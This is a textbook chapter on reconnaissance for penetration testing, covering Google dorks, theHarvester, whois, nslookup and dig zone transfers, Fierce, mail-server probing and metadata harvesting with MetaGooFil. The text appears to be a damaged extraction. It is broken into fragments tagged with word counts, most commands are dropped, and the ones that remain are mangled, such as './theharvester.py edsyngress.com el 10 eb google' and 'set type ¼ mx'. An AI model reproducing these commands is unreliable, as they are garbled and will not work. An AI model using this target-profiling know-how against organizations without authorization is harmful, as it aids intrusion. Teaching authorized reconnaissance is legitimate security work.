The Basics of Hacking and Penetration Testing
20
[Word Count: 8]

discuss scanning in Chapter 3, there is a speciﬁc order and a clear series of steps
that need to be followed in order to properly port scan a target.
[Word Count: 29]

Learning how to conduct digital reconnaissance is a valuable skill for anyone living
in today’s world. For penetration testers and hackers, it is invaluable. The pene-
tration testing world is ﬁlled with great examples and stories of how good recon
single-handedly allowed the tester to fully compromise a network or system.
[Word Count: 51]

It should be obvious that the difference between these two examples is prepa-
ration and homework. Hacking and penetration testing are the samedyou
cannot just get an Internet protocol (IP) address and start running Metasploit
(well you can, but you are probably not going to be very effective).
[Word Count: 48]

In Chapter 1, it was pointed out that a major difference between black hat and
white hat attackers is authorization. Step 1 provides us with a prime example of
[Word Count: 29]

this. Both types of hackers conduct exhaustive reconnaissance on their targets.
Unfortunately, malicious hackers are bound by neither scope nor authorization.
[Word Count: 21]

As a penetration tester, when you uncover risks that fall outside the scope of your current
engagement, you should make every effort to obtain proper authorization and expand the
scope of your test. Oftentimes, this will require you to work closely with your client and
their vendors in order to properly explain potential risks.
[Word Count: 54]

To be successful at reconnaissance, you must have a strategy. Nearly all facets of
information gathering leverage the power of the Internet. A typical strategy needs
to include both active and passive reconnaissance.
[Word Count: 33]

Active reconnaissance includes interacting directly with the target. It is important
to note that during this process, the target may record our IP address and log our
activity. This has a higher likelihood of being detected if we are attempting to
perform a PT in a stealth fashion.
[Word Count: 48]

Passive reconnaissance makes use of the vast amount of information available on
the web. When we are conducting passive reconnaissance, we are not interacting
directly with the target and as such, the target has no way of knowing, recording,
or logging our activity.
[Word Count: 43]

The Basics of Hacking and Penetration Testing
22
[Word Count: 8]

the information they gather. Each piece of paper is carefully cataloged and stored
in a folder. If you are going to use the traditional paper method, be sure to
carefully organize your records. Paper-based information gathering binders on
a single target can quickly grow to several hundred pages.
[Word Count: 48]

In most cases, the ﬁrst activity is to locate the target’s website. In our example, we
would use a search engine to look for “Syngress”.
[Word Count: 25]

Even though we recently discussed the importance of creating and using a “sandboxed
hacking lab” to ensure no trafﬁc leaves your network, practicing reconnaissance requires
a live Internet connection! If you want to follow along with the tools and examples in this
chapter, you will need to connect your attack machine to the Internet.
[Word Count: 54]

Typically, we begin Step 1 by closely reviewing the target’s website. In some cases,
it maybe helpful to use a tool called HTTrack to make a page-by-page copy of the
website. HTTrack is a free utility that creates an identical, ofﬂine copy of the
target website. The copied website will include all the pages, links, pictures, and
code from the original website; however, it will reside on your local computer.
Utilizing a website-copying tool like HTTrack allows us to explore and thor-
oughly mine the website “ofﬂine” without having to spend additional time
traipsing around on the company’s web server.
[Word Count: 100]

It is important to understand that the more time you spend navigating and exploring the
target website, the more likely it is that your activity can be tracked or traced (even if you
are simply browsing the site). Remember anytime you interact directly with a resource
owned by the target, there is a chance you will leave a digital ﬁngerprint behind.
[Word Count: 61]

Advanced penetration testers can also run automated tools to extract additional or hid-
den information from a local copy of a website.
[Word Count: 22]

HTTrack can be downloaded directly from the company’s website at http://www.httrack.
com/. Installing for Windows is as simple as downloading the installer .exe and clicking
next. If you want to install HTTrack in Kali or your Linux attack machine, you can connect
to the Internet as we described in Chapter 1, open a terminal, and type
[Word Count: 56]

Please note, there is also a graphical user interface (GUI) version of HTTrack but for now
we will focus on the terminal version. If you prefer to use the GUI you can always install it
at a later date.
[Word Count: 39]

Once the program is installed, you can run it by opening a terminal and typing
[Word Count: 15]

When HTTrack completes the process, you will be presented with a message in
the terminal that says “Done. Thanks for using HTTrack!” If you are using Kali
and accepted the default options, HTTrack will place the cloned site into the
directory /root/websites/<project_name> you can now open Firefox and enter
the address: /root/websites/<project_name> into the URL bar. Note the
<project_name> will need to be substituted for the name you used when setting
up your copy. You can interact with the copied website by clicking on the links in
the browser. A good place to start is usually the index.html ﬁle.
[Word Count: 99]

Firefox can be found by navigating the application menu/icon on the desktop or
by opening a terminal and typing
[Word Count: 19]

Whether you make a copy of the target website or you simply browse the target
in real time, it is important to pay attention to details. You should begin by
closely reviewing and recording all the information you ﬁnd on the target’s
website. Oftentimes, with very little digging, you will be able to make some
signiﬁcant ﬁndings including physical address and locations, phone numbers,
e-mail addresses, hours of operation, business relationships (partnerships),
employee names, social media connections, and other public tidbits.
[Word Count: 81]

The Basics of Hacking and Penetration Testing
24
[Word Count: 8]

included in the original target list, as they provide a potential gateway into the
organization.
[Word Count: 15]

In most cases, once we have thoroughly examined the target’s website, we should
have a solid understanding of the target including who they are, what they do,
where they are located, and a solid guess about the technology they use.
[Word Count: 40]

Armed with this basic information about the target, we can conduct some
passive reconnaissance. It is very difﬁcult, if not impossible, for a company to
determine when a hacker or penetration tester is conducting passive recon-
naissance. This activity offers a low-risk, high-reward situation for attackers.
Recall that passive reconnaissance is conducted without ever sending a single
packet to the target systems. Once again, our weapon of choice to perform this
task is the Internet. We begin by performing exhaustive searches of our target in
the various search engines available.
[Word Count: 90]

Although there are many great search engines available today, when covering the
basics of hacking and penetration testing, we will focus on Google. Google is
very, very good at its job. There is a reason why the company’s stock trades for
$400600 a share. Spiders from the company aggressively and repeatedly scour
all corners of the Internet cataloging information and send it back to the Google
servers. The company is so efﬁcient at its job, that oftentimes hackers can per-
form an entire penetration test using nothing but Google.
[Word Count: 89]

At Defcon 13, Johnny Long rocked the hacker community by giving a talk titled
“Google Hacking for Penetration Testers”. The talk by Johnny was followed up by
a book that went even deeper into the art of Google Hacking.
[Word Count: 39]

If you are interested in penetration testing, it is highly suggested that you watch Johnny
Long’s video and take a look at the Google Hacking book. You can see the video for free
online by searching the Defcon media archive available at http://www.defcon.org/html/
links/dc-archives.html. Johnny’s book is published by Syngress and available nearly
anywhere. His discoveries and their continued evolvement have changed penetration
testing and security forever. Johnny’s material is awesome and well worth your time.
[Word Count: 76]

Although we will not dive into the speciﬁcs of Google hacking, a solid under-
standing of how to use Google properly is vital to becoming a skilled pene-
tration tester. If you ask people “How do you use Google?”, they typically
respond by saying “Well it’s simple. You ﬁre up a web browser, navigate to
google.com, and type what you’re searching for into the box.”
[Word Count: 65]

While this answer is ﬁne for 99% of the planet, it is not good enough for
aspiring hackers and penetration testers. You have to learn to search in a smarter
way and maximize the return results. In short, you must cultivate your Google-
Fu. Learning how to use a search engine like Google properly will save you
time and allow you to ﬁnd the hidden gems that are buried in the trillions of
web pages in the Internet today.
[Word Count: 79]

GOOGLE DIRECTIVES: PRACTICING YOUR GOOGLE-FU
[Word Count: 5]

Luckily for us, Google provides “directives” that are easy to use and help us get
the most out of every search. These directives are keywords that enable us to
more accurately extract information from the Google Index.
[Word Count: 37]

Consider the following example: assume you are looking for information on the
Dakota State University (DSU) website (dsu.edu) about me. The simplest way to
perform this search is to enter the following terms in a Google search box: pat
[Word Count: 39]

engebretson dsu. This search will yield a fair number of hits. However (at the
time of this writing), only four of the ﬁrst 10 websites returned were pulled
directly from the DSU website.
[Word Count: 33]

By utilizing Google directives, we can force the Google index to do our bidding.
In the example above, we know both the target website and the keywords we
want to search. More speciﬁcally, we are interested in forcing Google to return
only results that are pulled directly from the target (dsu.edu) domain. In this
case, our best choice is to utilize the “site:” directive. Using the “site:” directive
forces Google to return only hits that contain the keywords we used and come
directly from the speciﬁed website.
[Word Count: 87]

To properly use a Google directive, you need three things:
[Word Count: 10]

1.
The name of the directive you want to use
2.
A colon
3.
The term you want to use in the directive.
[Word Count: 23]

After you have entered the three pieces of information above, you can search as
you normally would. To utilize the “site:” directive, we need to enter the
following into a Google search box:
[Word Count: 33]

Note that there is no space between the directive, colon, and domain. In our
earlier example, we wanted to conduct a search for Pat Engebretson on the DSU
website. To accomplish this, we would enter the following command into the
Google search bar:
[Word Count: 43]

The Basics of Hacking and Penetration Testing
26
[Word Count: 8]

Running this search provides us with drastically different results than our
initial attempt. First, we have trimmed the overall number of hits from
12,000þ down to more manageable 155. There is little doubt that a per-
son can sort through and gather information from 155 hits much quicker
than 12,000. Second and possibly more importantly, every single returned
result comes directly from the target website. Utilizing the “site:” directive
is a great way to search a speciﬁc target and look for additional infor-
mation. This directive allows you to avoid search overload and to focus
your search.
[Word Count: 97]

It is worth noting that all searches in Google are case insensitive so “pat”, “Pat”, and
“PAT” will all return the same results!
[Word Count: 23]

Another good Google directive to use is “intitle:” or “allintitle:”. Adding either of
these to your search causes only websites that have your search words in the title
of the web page to be returned. The difference between “intitle:” and “allintitle:”
is straightforward. “allintitle:” will only return websites that contain all the
keywords in the web page title. The “intitle:” directive will return any page whose
title contains at least one of the keywords you entered.
[Word Count: 76]

A classic example of putting the “allintitle:” Google hack to work is to perform
the following search:
[Word Count: 17]

Performing this search will allow us to view a list of any directories that have
been indexed and are available via the web server. This is often a great place to
gather reconnaissance on your target.
[Word Count: 36]

If we want to search for sites that contain speciﬁc words in the URL, we can use
the “inurl:” directive. For example, we can issue the following command to
locate potentially interesting pages on our target’s web page:
[Word Count: 38]

This search can be extremely useful in revealing administrative or conﬁguration
pages on your target’s website.
[Word Count: 16]

We can use the cache: directive to limit our search results and show only in-
formation pulled directly from the Google cache. The following search will
provide us with the cached version of the Syngress homepage:
[Word Count: 36]

It is important that you understand that clicking on any of the URLs will bring
you to the live website, not the cached version. If you want to view speciﬁc
cached pages, you will need to modify your search.
[Word Count: 39]

The last directive we will cover here is “ﬁletype:”. We can utilize “ﬁletype:” to
search for speciﬁc ﬁle extensions. This is extremely useful for ﬁnding speciﬁc
types of ﬁles on your target’s website. For example, to return only hits that
contain PDF documents, you would issue the following command:
[Word Count: 49]

This powerful directive is a great way to ﬁnd links to speciﬁc ﬁles like .doc, xlsx,
ppt, txt, and many more. Your options are nearly limitless.
[Word Count: 26]

For additional ﬂexibility, we can combine multiple directives into the same
search. For example, if we want to ﬁnd all the PowerPoint presentations on the
DSU website, you would enter the following command into the search box:
[Word Count: 37]

In this case, every result that is returned is a PowerPoint ﬁle and comes directly
from the dsu.edu domain! Figure 2.1 shows a screenshot of two searches: the
ﬁrst utilizes Google directives and the second shows the results from a tradi-
tional search. Utilizing Google directives has drastically reduced the number of
hits (by 186,950!).
[Word Count: 55]

Oftentimes, Google Hacking can also be referred to as “Google Dorks”. When an
application has a speciﬁc vulnerability, hackers and security researchers will
typically place a Google Dork in the exploit, which allows you to search for
vulnerable versions utilizing Google. The exploit-db.com website which is run
by the folks who created BackTrack and Kali Linux (Offensive-Security) has an
extensive list of Google Dorks and additional Google Hacking Techniques. If you
[Word Count: 71]

The Basics of Hacking and Penetration Testing
28
[Word Count: 8]

visit http://www.exploit-db.com and go to the Google Hacking Database
(GHDB) link (Figure 2.2):
[Word Count: 13]

You can select what to look for and use the large repository within the exploit-
db.com website to help aid you in your target (Figure 2.3).
[Word Count: 26]

Some other ones that often have a high yield of success with Google are the
following:
[Word Count: 16]

inurl:login
or the following:
Logon
Signin
Signon
Forgotpassword
Forgot
Reset
[Word Count: 10]

FIGURE 2.1
The power of Google directives.
[Word Count: 7]

FIGURE 2.2
Utilizing the exploit-db to access the GHDB.
[Word Count: 9]

These will help you ﬁnd common login or similar pages that may have dynamic
content. A lot of times you can ﬁnd vulnerabilities within these pages.
[Word Count: 26]

This one will list any directory browsing which will list everything within
a directory. Syngress does not have any of these vulnerabilities exposed however,
is a common way to ﬁnd additional ﬁles that may not be normally accessed
through web pages.
[Word Count: 41]

There are many other types of directives and Google hacks that you should
become familiar with. Along with Google, it is important that you become
efﬁcient with several other search engines as well. Oftentimes, different search
engines will provide different results, even when you search for the same key-
words. As a penetration tester conducting reconnaissance, you want to be as
thorough as possible. It is worth your time to learn how to leverage the search
capabilities of Yahoo, Bing, Ask, Dogpile, and many more.
[Word Count: 85]

As a ﬁnal warning, it should be pointed out that these passive searches are only
passive as long as you are searching. Once you make a connection with the target
system (by clicking on any of the links), you are back to active mode. Be aware
that active reconnaissance without prior authorization could be viewed as an
illegal activity.
[Word Count: 59]

Once you have thoroughly reviewed the target’s web page and conducted
exhaustive searches utilizing Google and other search engines, it is important to
explore other corners of the Internet. Newsgroups and Bulletin Board Systems
like UseNet and Google Groups can be very useful for gathering information
about a target. Support forums, Internet Relay Chart, and even “live chat”
features that allow you to talk to a representative of the company can be useful in
[Word Count: 74]

FIGURE 2.3
Selecting a category from the GHDB.
[Word Count: 8]

The Basics of Hacking and Penetration Testing
30
[Word Count: 8]

Even if our network admin is smart enough not to post detailed conﬁguration
ﬁles, it is hard to get support from the community without inadvertently leaking
some information. Reading even carefully scrubbed and redacted posts will
often reveal speciﬁc software version, hardware models, current conﬁguration
information, and the like about internal systems. All this information should be
ﬁled away for future use in the PT.
[Word Count: 65]

Public forums are an excellent way to share information and receive technical help.
However, when using these resources, be careful to use a slightly more anonymous
e-mail address like Gmail or Hotmail, rather than your corporate address.
[Word Count: 37]

Another example would be a PC tech who posts, “Problem with latest Microsoft
patch, had to uninstall. Will call MS in the morning.”
[Word Count: 23]

Or even the following, “Just ﬁnished the annual budget process. Looks like I’m
stuck with that Win2K server for another year.”
[Word Count: 21]

Although these examples may seem a bit over the top, you will be surprised at
the amount of information you can collect by simply monitoring what
employees post online.
[Word Count: 29]

THE HARVESTER: DISCOVERING AND LEVERAGING
E-MAIL ADDRESSES
[Word Count: 7]

An excellent tool to use in reconnaissance is the Harvester. The Harvester is
a simple but highly effective Python script written by Christian Martorella at
[Word Count: 25]

Edge Security. This tool allows us to quickly and accurately catalog both e-mail
addresses and subdomains that are directly related to our target.
[Word Count: 23]

It is important to always use the latest version of the Harvester as many search
engines regularly update and change their systems. Even subtle changes to
a search engine’s behavior can render automated tools ineffective. In some cases,
search engines will actually ﬁlter the results before returning information to you.
Many search engines also employ throttling techniques that will attempt to
prevent you from running automated searches.
[Word Count: 67]

You could also issue the full path to run the program:
[Word Count: 11]

If you are using a different version of Backtrack or Kali or are unable to ﬁnd the
Harvester (or any tool discussed in this book) at the speciﬁed path, you can use
the locate command to help ﬁnd where the tool is installed. In order to use the
locate command you need to ﬁrst run the updatedb command. To ﬁnd out where
the Harvester is installed on your system, open a terminal and type the
command:
[Word Count: 76]

The Basics of Hacking and Penetration Testing
32
[Word Count: 8]

The output from the locate command can be very verbose, but careful review of
the list should help you determine where the missing tool is installed. As pre-
viously mentioned, nearly all the penetration testing tools in Kali are located in
a subdirectory of the /usr/bin/ folder.
[Word Count: 47]

If you are using an OS other than Kali, you can download the tool directly from Edge
Security at http://www.edge-security.com. Once you have got it downloaded, you can
unpack the downloaded tar ﬁle by running the following command in a terminal:
[Word Count: 41]

Please note the capital “H” that is used when untarring the code. Linux is case-sensitive,
so the OS sees a difference between “theHarvester” and “theharvester”. You will need to
pay attention to the executable to determine if you should use a capital or lowercase “h”.
If the cases do not match exactly, you will typically get a message saying “no such ﬁle or
directory”. This is a good indication that you have mistyped the name of the ﬁle.
[Word Count: 78]

Regardless of whether you have downloaded the Harvester or used the version
preinstalled on your attack machine, we will use it to collect additional infor-
mation about our target. Be sure you are in theHarvester folder and run the
following command:
[Word Count: 41]

./theharvester.py edsyngress.com el 10 eb google
[Word Count: 6]

This command will search for e-mails, subdomains, and hosts that belong to
syngress.com. Figure 2.4 shows our results.
[Word Count: 18]

Now that you fully understand the command used to run the tool, let us take
a look at the results.
[Word Count: 20]

As you can see, the Harvester was effective in locating several e-mail addresses
that could be of value to us. Please note that the e-mail addresses in the
screenshot have been obfuscated. The Harvester was also successful in ﬁnding
two subdomains. Both “booksite.syngress.com” and “www.syngress.com” need
to be fully recon’d. We simply add these new domains to our target list and begin
the reconnaissance process again.
[Word Count: 66]

Step 1 of reconnaissance is very cyclical because in-depth reconnaissance often
leads to the discovery of new targets, which, in turn, lead to additional recon-
naissance. As a result, the amount of time to complete this phase will vary from
several hours to several weeks. Remember, a determined malicious hacker
understands not only the power of good reconnaissance but often has the ability
to spend a nearly limitless amount of time. As an aspiring penetration tester, you
should devote as much time as possible to practicing and conducting infor-
mation gathering.
[Word Count: 91]

WHOIS
A very simple but effective means for collecting additional information about
our target is Whois. The Whois service allows us to access speciﬁc information
about our target including the IP addresses or host names of the company’s
Domain Name Systems (DNS) servers and contact information which usually
contains an address and a phone number.
[Word Count: 55]

Whois is built into the Linux OS. The simplest way to use this service is to open
a terminal and enter the following command:
[Word Count: 24]

The Basics of Hacking and Penetration Testing
34
[Word Count: 8]

For example, to ﬁnd out information about Syngress, we would issue the fol-
lowing command: whois syngress.com. Figure 2.5 shows a partial output from
the result of this tool.
[Word Count: 29]

It is important to record all the information and pay special attention to the DNS
servers. If the DNS servers are listed by name only, as shown in Figure 2.5, we
will use the Host command to translate those names into IP addresses. We will
discuss the host command in the next section. You can also use a web browser to
search Whois. By navigating to http://www.whois.net, you can search for your
target in the “WHOIS Lookup” box as shown in Figure 2.6.
[Word Count: 83]

Again it is important to closely review the information you are presented with.
Sometimes, the output will not provide many details. We can often access these
[Word Count: 26]

FIGURE 2.5
Partial output from a Whois query.
[Word Count: 8]

FIGURE 2.6
Whois.net a web-based Lookup tool.
[Word Count: 7]

additional details by querying the speciﬁc whois server listed in the output of our
original search. Figure 2.7 shows an example of this.
[Word Count: 23]

When available, we can conduct a further Whois search by following the link
provided in the “Referral URL:” ﬁeld. You may have to search the web page for
a link to their Whois service. By using Safename’s Whois service, we can extract
a signiﬁcantly larger amount of information as shown here:
[Word Count: 51]

The Registry database contains ONLY .COM, .NET, .EDU domains and
Registrars.[whois.safenames.net]
Safenames Whois Server Version 2.0
[Word Count: 16]

Domain Name: SYNGRESS.COM
[REGISTRANT]
Organisation Name: Elsevier Ltd
Contact Name: Domain Manager
Address Line 1: The Boulevard
Address Line 2: Langford Lane, Kidlington
City/Town: Oxfordshire
State/Province:
Zip/Postcode: OX5 1GB
Country: UK
Telephone: þ44 (18658) 43830
Fax: þ44 (18658) 53333
[Word Count: 39]

Email: domainsupport@elsevier.com
[ADMIN]
Organisation Name: Safenames Ltd
Contact Name: International Domain Administrator
Address Line 1: PO Box 5085
[Word Count: 18]

FIGURE 2.7
Whois output showing where to go for additional details.
[Word Count: 11]

The Basics of Hacking and Penetration Testing
36
[Word Count: 8]

Address Line 2:
City/Town: Milton Keynes MLO
State/Province: Bucks
Zip/Postcode: MK6 3ZE
Country: UK
Telephone: þ44 (19082) 00022
Fax: þ44 (19083) 25192
[Word Count: 22]

Email: hostmaster@safenames.net
[TECHNICAL]
Organisation Name: International Domain Tech
Contact Name: International Domain Tech
Address Line 1: PO Box 5085
Address Line 2:
City/Town: Milton Keynes MLO
State/Province: Bucks
Zip/Postcode: MK6 3ZE
Country: UK
Telephone: þ44 (19082) 00022
Fax: þ44 (19083) 25192
[Word Count: 41]

Another great source of information is Netcraft. You can visit their site at http://
news.netcraft.com. Start by searching for your target in the “What’s that site
Running?” textbox as shown in Figure 2.8.
[Word Count: 33]

Netcraft will return any websites it is aware of that contain your search words. In
our example, we are presented with three sites: syngress.com, www.syngress.
com, and booksite.syngress.com. If any of these sites have escaped our previ-
ous searches, it is important to add them to our potential target list. The returned
results page will allow us to click on a “Site Report”. Viewing the site report
should provide us with some valuable information as shown in Figure 2.9.
[Word Count: 79]

As you can see, the site report provides us with some great information about our
target including the IP address and OS of the web server as well as the DNS
server. Once again all this information should be cataloged and recorded.
[Word Count: 42]

FIGURE 2.9
Site report for Syngress.com.
[Word Count: 6]

The Basics of Hacking and Penetration Testing
38
[Word Count: 8]

HOST
Oftentimes, our reconnaissance efforts will result in host names rather than IP
addresses. When this occurs, we can use the “host” tool to perform a translation
for us. The host tool is built into most Linux systems including Kali. We can
access it by opening a terminal and typing:
[Word Count: 50]

Suppose in our previous searches, we uncovered a DNS server with the host
name “ns1.dreamhost.com”. To translate this into an IP address, we would enter
the following command in a terminal:
[Word Count: 31]

Figure 2.10 shows the result of this tool.
[Word Count: 8]

The host command can also be used in reverse. It can be used to translate IP
addresses into host names. To perform this task, simply enter
[Word Count: 26]

Using the “ea” switch will provide you with verbose output and possibly reveal
additional information about your target. It is well worth your time to review the
“host” documentation and help ﬁles. You can do so by issuing the “man host”
command in a terminal window. This help ﬁle will allow you to become familiar
with the various options that can be used to provide additional functionality to
the “host” tool.
[Word Count: 71]

DNS servers are an excellent target for hackers and penetration testers. They
usually contain information that is considered highly valuable to attackers. DNS
is a core component of both our local networks and the Internet. Among other
things, DNS is responsible for the process of translating domain names to IP
addresses. As humans, it is much easier for us to remember “google.com” rather
than http://74.125.95.105. However, machines prefer the reverse. DNS serves as
the middle man to perform this translation process.
[Word Count: 81]

As penetration testers, it is important to focus on the DNS servers that belong to
our target. The reason is simple. In order for DNS to function properly, it needs
to be aware of both the IP address and the corresponding domain name of each
computer on its network. In terms of reconnaissance, gaining full access to
[Word Count: 57]

a company’s DNS server is like ﬁnding a pot of gold at the end of a rainbow. Or
maybe, more accurately, it is like ﬁnding a blueprint to the organization. But in
this case, the blueprint contains a full listing of internal IP addresses and host
names that belong to our target. Remember one of the key elements of infor-
mation gathering is to collect IP addresses that belong to the target.
[Word Count: 72]

Aside from the pot of gold, another reason why picking on DNS is so enjoyable
is that in many cases these servers tend to operate on the “if it isn’t broke, don’t
touch it” principle.
[Word Count: 35]

As a penetration tester, given the number of misconﬁgured and unpatched DNS
servers that abound today, it is natural to assume that many current network
admins operate under the same principle.
[Word Count: 31]

Now that we have a list of DNS IP addresses that belong to or (serve our target)
we can begin the process of interrogating DNS to extract information. Although
it is becoming rarer to ﬁnd, one of our ﬁrst tasks when interacting with a target
DNS is to attempt a zone transfer.
[Word Count: 52]

Recall that DNS servers contain a series of records that match up the IP address and
host name for all the devices that the servers are aware of. Many networks deploy
multiple DNS servers for the sake of redundancy or load balancing. As a result,
DNS servers need a way to share information. This “sharing” process occurs
through the use of a zone transfer. During a zone transfer, also commonly referred
to as AXFR, one DNS server will send all the host-to-IP mappings it contains to
another DNS server. This process allows multiple DNS servers to stay in sync.
[Word Count: 99]

Even if we are unsuccessful in performing a zone transfer, we should still spend
time investigating any DNS servers that fall within our authorized scope.
[Word Count: 25]

The Basics of Hacking and Penetration Testing
40
[Word Count: 8]

The ﬁrst tool we will use to examine DNS is nslookup. nslookup is a tool that
can be used to query DNS servers and potentially obtain records about the
various hosts of which it is aware. nslookup is built into many versions of Linux
including Kali and is even available for Windows. nslookup operates very sim-
ilarly between the various OSs; however, you should always review the speciﬁcs
for your particular system. You can do so in Linux by reviewing the nslookup
man page. This is accomplished by opening a terminal and typing
[Word Count: 93]

A software’s man page is a text-based documentation system that describes a particular
tool, including its basic and advanced uses, and other details about how the program
functions. Most Linux-based tools include a man page. This can be extremely helpful
when attempting to run a new program or troubleshoot issues. To view the man page for
a tool, open a terminal and enter the command:
[Word Count: 65]

Obviously you will need to replace “tool_name” with the program name you are
attempting to read about.
[Word Count: 17]

nslookup is a tool that can be run in interactive mode. This simply means we will
ﬁrst invoke the program and then feed it the particular switches we need to make
it function properly. We begin using nslookup by opening a terminal and
entering:
[Word Count: 44]

By issuing the “nslookup” command, we start the nslookup tool from the OS.
After typing “nslookup” and hitting enter, your usual “#” prompt will be
replaced with a “>” prompt. At this point, you can enter the additional infor-
mation required for nslookup to function.
[Word Count: 45]

We begin feeding commands to nslookup by entering the “server” keyword and
an IP address of the DNS server you want to query. An example follows:
[Word Count: 26]

nslookup will simply accept the command and present you with another “>”
prompt. Next, we specify the type of record we are looking for. During the
reconnaissance process, there are many types of records that you maybe inter-
ested in. For a complete listing of the various DNS record types and their
description, you can use your newly acquired Google skills! If you are looking
for general information, you should set the type to any by using the keyword
“any”:
[Word Count: 80]

Be sure to pay special attention to the spacing or you will get an error message. If
you are looking for speciﬁc information from the DNS server such as the IP
address of the mail server that handles e-mail for the target organization, you
would use the “set type ¼ mx”.
[Word Count: 51]

We wrap up our initial DNS interrogation with nslookup by entering the target
domain after the next “>” prompt.
[Word Count: 19]

Utilizing the set type ¼ any option in nslookup will provide us with a more complete
DNS record including the information in Figure 2.11.
[Word Count: 24]

DIG
Another great tool for extracting information from DNS is “dig”. To work with
dig, we simply open a terminal and enter the following command:
[Word Count: 25]

Naturally, you will need to replace the “target_ip” with the actual IP address of
your target. Among other things, dig makes it very simple to attempt a zone
transfer. Recall that a zone transfer is used to pull multiple records from a DNS
server. In some cases, a zone transfer can result in the target DNS server sending
[Word Count: 58]

FIGURE 2.11
Combining host and nslookup to determine the address of our target’s e-mail server (MX record).
[Word Count: 17]

The Basics of Hacking and Penetration Testing
42
[Word Count: 8]

all the records it contains. This is especially valuable if your target does not
distinguish between internal and external IPs when conducting a zone transfer.
We can attempt a zone transfer with dig by using the “et AXFR” switch.
[Word Count: 39]

If we wanted to attempt a zone transfer against a ﬁctitious DNS server with an IP
address of 192.168.1.23 and a domain name of “example.com” we would issue
the following command in a terminal window:
[Word Count: 35]

If zone transfers are allowed and not restricted, you will be presented with
a listing of host and IP addresses from the target DNS server that relate to your
target domain.
[Word Count: 31]

FIERCE: WHAT TO DO WHEN ZONE TRANSFERS FAIL
[Word Count: 8]

As we have previously discussed, most administrators today are savvy enough to
prevent random people from completing an unauthorized zone transfer.
However, all is not lost. If your zone transfer fails, there are dozens of good DNS
interrogation tools. Fierce is an easy to use, powerful Perl script that can provide
you with dozens of additional targets.
[Word Count: 57]

In Kali, you can ﬁnd Fierce in the /usr/bin/ directory. Once again, you can
simply open a terminal and issue the “ﬁerce” command (along with the required
switches) or you can move into the /usr/bin/ directory. If you prefer to run Fierce
from the /usr/bin directory, you will need to open a terminal and issuing the
following command:
[Word Count: 58]

Inside the Fierce directory, you can run the tool by executing the ﬁerce.pl script
and utilizing the edns switch followed by your target domain.
[Word Count: 24]

If you are using an attack machine which does not have Fierce preinstalled you can get it
by running the command:
[Word Count: 21]

There are many additional tools that can be used to interact with DNS. These
tools should be explored and utilized once you have a solid understanding of
how DNS works. Please see the end of this chapter for a brief discussion of some
additional tools you may want to use when conducting a penetration test
involving DNS.
[Word Count: 57]

EXTRACTING INFORMATION FROM E-MAIL SERVERS
[Word Count: 5]

E-mail servers can provide a wealth of information for hackers and penetration
testers. In many ways, e-mail is like a revolving door to your target’s organiza-
tion. Assuming your target is hosting their own e-mail server, this is often a great
place to attack. It is important to remember, “You can’t block what you must let
in.” In other words, for e-mail to function properly, external trafﬁc must pass
through your border devices like routers and ﬁrewalls, to an internal machine,
typically somewhere inside your protected networks.
[Word Count: 87]

As a result of this, we can often gather signiﬁcant pieces of information by
interacting directly with the e-mail sever. One of the ﬁrst things to do when
attempting to recon an e-mail server is to send an e-mail to the organization with
an empty .bat ﬁle or a nonmalicious .exe ﬁle like calc.exe. In this case, the goal is
to send a message to the target e-mail server inside the organization in the hope
of having the e-mail server inspect, and then reject the message.
[Word Count: 86]

Once the rejected message is returned back to us, we can attempt to extract
information about the target e-mail server. In many cases, the body of the
message will include a precanned write-up explaining that the server does not
accept e-mails with potentially dangerous extensions. This message often in-
dicates the speciﬁc vendor and version of antivirus that was used to scan the
e-mail. As an attacker, this is a great piece of information to have.
[Word Count: 76]

Having a return message from a target e-mail server also allows us to inspect the
headers of the e-mail. Inspecting the Internet headers will often allow us to
extract some basic information about the e-mail server, including IP addresses
and the speciﬁc software versions or brand of e-mail server running. Knowing
the IP address and software versions can be incredibly useful when we move into
the exploitation phase (Step 3).
[Word Count: 70]

The Basics of Hacking and Penetration Testing
44
[Word Count: 8]

The ability of an attacker to read this information may present some unique
insights into the target organization including user names, computer or server
names, network paths, ﬁles shares, and other goodies. MetaGooFil is a tool that
scours the Internet looking for documents that belong to your target. After
ﬁnding these documents, MetaGooFil downloads them and attempts to extract
useful metadata.
[Word Count: 61]

MetaGooFil is built into Kali and can be invoked by opening a terminal window
and running the “metagooﬁl” command (along with the appropriate switches)
or by navigating to the MetaGooFil executable which is located in the /usr/bin
directory. This can be accomplished by entering the following command:
[Word Count: 47]

After navigating to the MetaGooFil directory, it is a good idea to create a “ﬁles”
folder. The purpose of this folder is to hold all the target ﬁles that will be
downloaded; this keeps the original directory clean. You can create a new folder
by entering:
[Word Count: 46]

With this directory setup, you can run MetaGooFil by issuing the following
command:
[Word Count: 13]

./metagoofil.py -d syngress.com et pdf,doc,xls,pptx en 20
-o files ef results.html
[Word Count: 11]

While the output from MetaGooFil against Syngress reveals nothing, below
you will ﬁnd a sample of the tool’s output from a recent penetration test that
clearly provides additional value and should be included with our reconnais-
sance data.
[Word Count: 38]

C:\Documents and Settings\dennisl\My Documents\
[Word Count: 4]

This example is rich with information. First, it provides us with a valid network
user name “dennisl”. Second, it clearly shows that Dennis uses a Windows
machine.
[Word Count: 27]

Another option for reconnaissance, which includes several information gath-
ering tools built into one, is called ThreatAgent Drone. This tool was developed
by Marcus Carey. You can sign up for a free account at https://www.threatagent.
com as shown in Figure 2.12:
[Word Count: 41]

ThreatAgent takes OSINT gathering to the next level by using a number of dif-
ferent sites, tools, and technologies to create an entire dossier for you about your
target. The only thing you need is the organization name (Syngress) and
a domain name such as syngress.com as shown in Figure 2.13.
[Word Count: 51]

Once the drone is ﬁnished extracting all the information from the various
websites, it will present a report to you including IP address ranges, e-mail
addresses, points of contact within the organization, ports that are open
[Word Count: 36]

FIGURE 2.12
Signing up for a free ThreatAgent account.
[Word Count: 9]

FIGURE 2.13
Starting a search with ThreatAgent.
[Word Count: 7]

The Basics of Hacking and Penetration Testing
46
[Word Count: 8]

(through Shodan), and much more. Interesting enough, when doing a search for
Syngress, I came up as the ﬁrst result (not faked!) as shown in Figure 2.14.
[Word Count: 27]

From the results, you can parse names from LinkedIn, Jigsaw, and a number of
other public sites and ﬁnd a large list of e-mail addresses that get extracted and
added through tools like theHarvester as shown in Figure 2.15.
[Word Count: 39]

This is one awesome tool for penetration testers, and something that I highly
recommend if you are performing reconnaissance on an organization or
company.
[Word Count: 24]

FIGURE 2.15
Additional attack vectors identiﬁed by ThreatAgent.
[Word Count: 8]

No discussion of reconnaissanceor hacking would be completewithout including
social engineering. Many people would argue that social engineering is one of the
most simple and effective means for gathering information about a target.
